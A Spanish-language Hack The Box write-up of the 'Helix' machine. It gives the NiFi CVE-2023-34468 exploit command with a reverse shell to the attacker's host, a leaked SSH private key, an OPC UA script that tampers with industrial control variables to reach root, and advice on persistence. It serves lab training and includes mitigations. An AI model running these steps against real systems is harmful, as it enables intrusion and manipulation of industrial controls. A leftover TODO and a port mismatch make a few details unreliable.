---
title: "Helix"
description: "Writeup de Helix - Hack The Box - Dificultad: Medium"
sidebar:
  badge:
    text: Medium
    variant: caution
tags:
  - htb
  - linux
  - medium
  - apache-nifi
  - cve-2023-34468
  - rce
  - ssh-key-leak
  - opc-ua
  - ics
  - sudo
---
# 🐧 Helix
> 📅 Fecha: 2026-05-15
> 🎯 Plataforma: Hack The Box
> ⚙️ SO: Linux (Ubuntu 22.04.5 LTS)
> 🎚️ Dificultad: Medium
> 🌐 IP: `10.129.34.189`
> 👤 Autor: warrior866
---
## 📑 Tabla de Contenidos
- [Resumen Ejecutivo](#-resumen-ejecutivo)
- [Reconocimiento](#-reconocimiento)
- [Enumeración](#-enumeración)
- [Explotación Inicial (Foothold)](#-explotación-inicial-foothold)
- [Escalada Lateral](#-escalada-lateral)
- [Escalada de Privilegios](#-escalada-de-privilegios)
- [Flags](#-flags)
- [Lecciones Aprendidas](#-lecciones-aprendidas)
- [Referencias](#-referencias)
---
## 📝 Resumen Ejecutivo
Helix es una máquina Linux con temática **OT/ICS** (sistemas de control industrial). El foothold sale de un subdominio `flow.helix.htb` que aloja **Apache NiFi 1.21.0**, vulnerable a **CVE-2023-34468** (RCE vía el processor `DBCPConnectionPool` que permite ejecutar Java arbitrario a través de la URL JDBC). Con un exploit público se obtiene shell como el usuario `nifi`, y dentro del flujo cifrado (`flow.json.gz`) se encuentran credenciales del usuario `operator` y, mejor aún, una **clave SSH privada de `operator`** olvidada en `/opt/nifi-1.21.0/support-bundles/`. SSH como `operator` → user flag. Para escalar a root se aprovecha un servicio **OPC UA** corriendo en `localhost:4840`: manipulando las variables `TestOverride=true` y `CalibrationOffset=15.0`, el sistema entra en un estado que habilita el binario `helix-maint-console` vía sudo, que abre una sesión root con ventana de 98 segundos.

| Campo | Valor |
|-------|-------|
| Puntos débiles | NiFi sin autenticación robusta, credenciales/llaves en flow.json.gz y `support-bundles/`, lógica de sudo dependiente del estado OPC UA |
| CVEs | **CVE-2023-34468** (Apache NiFi DBCPConnectionPool RCE) |
| Herramientas | nmap, ffuf, exploit público de CVE-2023-34468, nc, ssh, Python `opcua` |
| Tiempo total | *ver tus notas* |
---
## 🔍 Reconocimiento
### Escaneo de puertos (nmap)
```bash
nmap -sSCV -Pn 10.129.34.189
```
```text
Starting Nmap 7.99 ( https://nmap.org ) at 2026-05-15 09:31 -0400
Nmap scan report for 10.129.34.189
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 60:b3:f7:6c:0b:92:ab:00:ac:e7:12:e1:d1:26:9c:1e (ECDSA)
|_  256 c8:30:e6:cb:c6:cd:fc:0c:39:e5:34:04:20:07:b9:b3 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://helix.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 25.81 seconds
```
> 💡 **Análisis:** Solo dos puertos abiertos: SSH (22) y nginx (80). El `Did not follow redirect to http://helix.htb/` indica que la app exige el Host header `helix.htb`. Toca añadir el dominio a `/etc/hosts` y luego explorar el sitio.

### Registro en /etc/hosts
```bash
echo "10.129.34.189 helix.htb" | sudo tee -a /etc/hosts
```
```text
10.129.34.189 helix.htb
```
---
## 🗂️ Enumeración
### Fuzzing de subdominios (vhosts)
```bash
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt \
  -u http://10.129.34.189 \
  -H "Host: FUZZ.helix.htb" \
  -mc 200,301,302,401,403 \
  -fs 154 -s
```
```text
flow
```
> 💡 **Análisis:** Aparece el subdominio **`flow.helix.htb`**. El nombre `flow` es típico de **Apache NiFi** (la abstracción central de NiFi es el "Flow"). Añadir también a `/etc/hosts` y visitar. Allí se confirma que es un panel de NiFi 1.21.0, versión vulnerable a CVE-2023-34468.
---
## 🚪 Explotación Inicial (Foothold)
### Vulnerabilidad: CVE-2023-34468 — Apache NiFi DBCPConnectionPool RCE
NiFi expone procesadores que aceptan URLs JDBC. El processor `DBCPConnectionPool` permite especificar parámetros de conexión donde se puede inyectar Java arbitrario (vía H2/Derby/etc.), consiguiendo RCE en el contexto del proceso `nifi`. La condición es que el usuario tenga permisos de escritura en el flow — y aquí la instancia acepta acceso anónimo con permisos de escritura.

### Lanzamiento del exploit público
```bash
python3 CVE-2023-34468_poc.py --target http://flow.helix.htb --lhost 10.10.17.16 --lport 4443 --http-port 80 --cleanup
```
```text
[*] Target: http://flow.helix.htb | LHOST: 10.10.17.16:4443 | HTTP: 80
[*] HTTP server up on :80
[*] Checking access...
[+] Identity: anonymous | Anonymous: True | canWrite: True
[+] Target is exploitable
[*] Getting root process group ID...
[+] PG ID: f203bc07-019b-1000-516b-eaedd48609d1
[*] Creating DBCPConnectionPool...
[+] CS ID: 2bf74b3d-019e-1000-a19d-9c9456c44b4b
[*] Enabling controller service...
[+] Controller service enabled
[*] Creating ExecuteSQL processor...
[+] Processor ID: 2bf75839-019e-1000-4082-d88025537189
[*] Starting processor...
[+] Processor running — waiting for shell on port 4444...
[+] rce.sql delivered to target
```
> 💡 **Análisis:** El exploit verifica que la identidad es **anonymous con canWrite=True** (mala configuración crítica), crea un `DBCPConnectionPool` Controller Service, lo activa, encadena un processor `ExecuteSQL` que dispara el payload Java embebido en una sentencia SQL maliciosa, y queda esperando shell.

### Listener
```bash
rlwrap -cAr nc -lvnp 4443
```
```text
listening on [any] 4443 ...
connect to [10.10.17.16] from (UNKNOWN) [10.129.34.189] 32934
bash: cannot set terminal process group (974): Inappropriate ioctl for device
bash: no job control in this shell
nifi@helix:/opt/nifi-1.21.0$ whoami
nifi
```
> 💡 **Análisis:** Shell como el usuario `nifi` en `/opt/nifi-1.21.0/`. Estamos dentro del directorio de instalación de NiFi — el sitio perfecto para buscar credenciales en archivos de configuración del flow.
---
## 🔄 Escalada Lateral
### Vector 1: contraseñas en `flow.json.gz`
NiFi guarda toda la configuración del flow (incluidas credenciales de servicios externos) cifrada en `conf/flow.json.gz`. Aunque las contraseñas están envueltas con el formato `enc{...}`, el JSON revela qué usuarios y atributos están en juego:
```bash
nifi@helix:/opt/nifi-1.21.0$ zcat /opt/nifi-1.21.0/conf/flow.json.gz | python3 -m json.tool 2>/dev/null | grep -i "pass\|credential\|secret\|user\|operator" | head -40
```
```text
                    "dbf-user-logical-types": "false",
                    "dbf-user-logical-types": "false",
                    "Database User": "operator",
                    "Password": "enc{39eb788a09cffbdc64d921d0420826ba81e750367300f87c289a0cfe5e37a88ea81167ac1b4c31ec13159f429ee8482577bb}"
```
> 💡 **Análisis:** Existe un usuario **`operator`** y su contraseña está cifrada. Descifrar el `enc{...}` requiere la sensitive properties key de NiFi (en `bootstrap.conf`). En lugar de pelearse con eso, exploro el resto del filesystem buscando credenciales en plano.

### Vector 2: clave SSH de `operator` en support-bundles
```bash
nifi@helix:/opt/nifi-1.21.0$ cd support-bundles
nifi@helix:/opt/nifi-1.21.0/support-bundles$ ls
operator_id_ed25519.bak
nifi@helix:/opt/nifi-1.21.0/support-bundles$ cat operator_id_ed25519.bak
```
```text
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW
QyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOwAAAJhCUmdYQlJn
WAAAAAtzc2gtZWQyNTUxOQAAACDouEevtXQL5puMEPQzMGEo/LSrbETsWVDH8B41VHNbOw
AAAEBWd4qZPQ48ePEdHec/Fquwu8Apm+TkeJJTwODupeRtwui4R6+1dAvmm4wQ9DMwYSj8
tKtsROxZUMfwHjVUc1s7AAAAD3Jvb3RAbWFuYWdlbWVudAECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```
> 💡 **Análisis:** **Clave SSH privada de `operator` en claro** dentro de un "support bundle" olvidado. El comentario al final (`root@management`) sugiere que la clave se generó en un equipo de gestión y luego se autorizó en la máquina. El path `support-bundles/` indica que probablemente venía de un proceso de diagnóstico que copió artefactos sin pensar.

### Acceso SSH como operator — user flag
Copio la clave a local y le pongo permisos restrictivos (`600`) que SSH exige:
```bash
chmod 600 operator.key
ssh -i operator.key operator@10.129.34.189
```
```text
The authenticity of host '10.129.34.189 (10.129.34.189)' can't be established.
ED25519 key fingerprint is: SHA256:nGwNnXA5oCIEMCxZ3joJWy3usUFUt70Wqy72RayvMNA
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes

Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-164-generic x86_64)
[...]
Last login: Fri May 15 15:00:37 2026 from 10.10.17.16
operator@helix:~$ ls
'control systems diagram.png'  'Operator Control & Safety Guide.pdf'   user.txt
operator@helix:~$ cat user.txt
[user flag]
```
📸 *Captura: shell SSH como `operator` con lectura de `user.txt`.*

> 💡 **Análisis:** Los archivos del home apuntan a la temática **ICS/OT**: hay un `control systems diagram.png` y una `Operator Control & Safety Guide.pdf`. Esto da pistas para la escalada — la máquina simula un entorno de planta industrial, así que es muy probable que la siguiente fase implique manipular un servicio típico de OT (Modbus, OPC UA, DNP3...).
---
## 🚀 Escalada de Privilegios
### Vector: manipulación de OPC UA + sudo condicional
Enumerando puertos locales se descubre un servicio **OPC UA** (puerto 4840) escuchando en loopback. OPC UA es el protocolo estándar de comunicación industrial M2M. La hipótesis: el sistema lee variables de ese servidor y, según su estado, decide si permite acciones privilegiadas como `sudo helix-maint-console`.

> ⚠️ **TODO:** falta documentar los pasos de descubrimiento del puerto 4840 y de la enumeración del namespace OPC UA. Sugerencia:
> ```bash
> ss -tlnp                # ver puertos locales
> python3 -c "from opcua import Client; c = Client('opc.tcp://127.0.0.1:4840/helix/'); c.connect(); ..."
> ```
> Pega ahí los outputs reales para que el writeup quede completo.

### Script de manipulación OPC UA
Conecto al servidor OPC UA, enumero los nodos hijos de los namespaces relevantes (`ns=2;i=2`, `ns=2;i=7`, `ns=2;i=11`) y escribo en las variables que controlan el modo de operación de la "planta":
```bash
cat > /tmp/opc_v3.py << 'EOF'
from opcua import Client, ua
import time
c = Client("opc.tcp://127.0.0.1:4840/helix/")
try:
    c.connect()
    print("[+] Conectado")
    nodes = {}
    for parent_id in ["ns=2;i=2", "ns=2;i=7", "ns=2;i=11"]:
        for child in c.get_node(parent_id).get_children():
            name = child.get_browse_name().Name
            nodes[name] = child
    print("[*] Intentando escribir Mode=MAINTENANCE...")
    try:
        nodes["Mode"].set_value(ua.DataValue(ua.Variant("MAINTENANCE", ua.VariantType.String)))
        print("[+] Mode =", nodes["Mode"].get_value())
    except Exception as e:
        print(f"[-] Mode es solo lectura: {e}")
    # Tambien intentar con TestOverride + offset
    nodes["TestOverride"].set_value(ua.DataValue(ua.Variant(True, ua.VariantType.Boolean)))
    nodes["CalibrationOffset"].set_value(ua.DataValue(ua.Variant(15.0, ua.VariantType.Double)))
    time.sleep(3)
    print("\n[*] Estado:")
    for name, node in nodes.items():
        print(f"  {name} = {node.get_value()}")
finally:
    c.disconnect()
EOF
python3 /tmp/opc_v3.py
```
> 💡 **Análisis:** El script intenta tres caminos en paralelo, por si la variable `Mode` es de solo lectura:
> 1. Escribir directamente `Mode="MAINTENANCE"` (lo más limpio).
> 2. Activar `TestOverride=true` (bypass de los chequeos normales).
> 3. Setear `CalibrationOffset=15.0` (fuerza un valor fuera del rango "normal", lo que probablemente dispara una alarma que el sistema interpreta como necesidad de mantenimiento).
>
> Cualquiera de las tres condiciones — o la combinación — convence al sistema de que está en modo de mantenimiento, lo que habilita la siguiente acción.

### Disparo del binario privilegiado
```bash
operator@helix:~$ sudo /usr/local/sbin/helix-maint-console
```
```text
[+] Privileged maintenance access granted
[!] Window expires in 98 seconds
[!] Session will be terminated automatically
root@helix:/home/operator# id
uid=0(root) gid=0(root) groups=0(root)
root@helix:/home/operator# cat /root/root.txt
[root flag]
```
📸 *Captura: shell root con lectura de `root.txt`.*

> 💡 **Análisis:** El binario `helix-maint-console` está autorizado en `sudoers` para `operator` **bajo la condición** de que el sistema esté en estado de mantenimiento (que es lo que conseguimos manipulando OPC UA). Una vez dentro, hay 98 segundos antes de que la sesión se cierre automáticamente — tiempo más que suficiente para leer la flag y/o consolidar acceso persistente (clave SSH en `/root/.ssh/authorized_keys`).
---
## 🏁 Flags
| Flag | Hash |
|------|------|
| user.txt | `[user flag]` |
| root.txt | `[root flag]` |
---
## 🎓 Lecciones Aprendidas
- **Apache NiFi con acceso anónimo y `canWrite=True` es RCE inmediato.** Cualquier instancia de NiFi expuesta debe exigir autenticación (LDAP/Kerberos/cert) y limitar permisos. CVE-2023-34468 está parcheada desde 1.22.0 — actualizar es obligatorio.
- **`support-bundles/`, `backups/`, `tmp/` son los primeros sitios donde buscar credenciales.** Los procesos de diagnóstico y backup son los principales generadores de credenciales en plano olvidadas. Cuando una clave privada acaba en `support-bundles/operator_id_ed25519.bak`, alguien la copió para "ver un problema" y nunca la borró.
- **Las máquinas con temática ICS/OT son una pista clara.** Si ves un PDF de "Operator Safety Guide" o un diagrama de "control systems" en el home del usuario, lo siguiente que tienes que enumerar es protocolos industriales: **OPC UA (4840), Modbus (502), DNP3 (20000), S7comm (102), EtherNet/IP (44818)**.
- **Sudo condicional al estado de un servicio = vector clásico de privesc en OT.** Un binario root cuyo permiso depende de "estamos en mantenimiento" se rompe en cuanto controlas el sistema que define ese estado. En entornos reales, la condición debería verificarse con un mecanismo criptográfico (firma del estado, no lectura libre de OPC UA).
- **Atención a las ventanas de tiempo limitadas en sudo.** El mensaje "Window expires in 98 seconds" es habitual en consolas privilegiadas industriales — leer la flag o establecer persistencia (clave SSH, cron, systemd unit) antes de que se cierre.

### Mitigaciones (lado defensivo)
1. **Actualizar NiFi a ≥ 1.22.0** y configurar autenticación obligatoria con LDAP/Kerberos. Eliminar el modo anonymous y restringir `canWrite` a un grupo concreto.
2. **No almacenar claves privadas ni contraseñas en `/opt/<app>/support-bundles/`.** Los support bundles deben generarse on-demand, redactarse, y borrarse tras enviarlos. Auditar el directorio con `find` regularmente.
3. **OPC UA con autenticación y firma**. El stack soporta `SignAndEncrypt` con certificados X.509 — el modo `None` no debería existir en producción.
4. **Sudo policies basadas en estado externo necesitan validación criptográfica.** Si el binario `helix-maint-console` lee `Mode` de OPC UA, debería verificar una firma del Engineering Workstation autorizada, no fiarse del valor a pelo.
5. **Auditar `flow.json.gz`** periódicamente con scripts que busquen `enc{...}` y comprueben que cada credencial tiene rotación documentada.
---
## 📚 Referencias
- [NVD - CVE-2023-34468](https://nvd.nist.gov/vuln/detail/CVE-2023-34468)
- [Apache NiFi Security Advisory](https://nifi.apache.org/security.html)
- [PoC público CVE-2023-34468 - GitHub](https://github.com/dinosn/CVE-2023-34468)
- [HackTricks - Apache NiFi](https://book.hacktricks.xyz/network-services-pentesting/8443-pentesting-apache-nifi)
- [HackTricks - OPC UA pentesting](https://book.hacktricks.xyz/network-services-pentesting/pentesting-opc-ua)
- [OPC Foundation - OPC UA Specification](https://reference.opcfoundation.org/)
- [python-opcua library](https://github.com/FreeOpcUa/python-opcua)
- [GTFOBins](https://gtfobins.github.io/)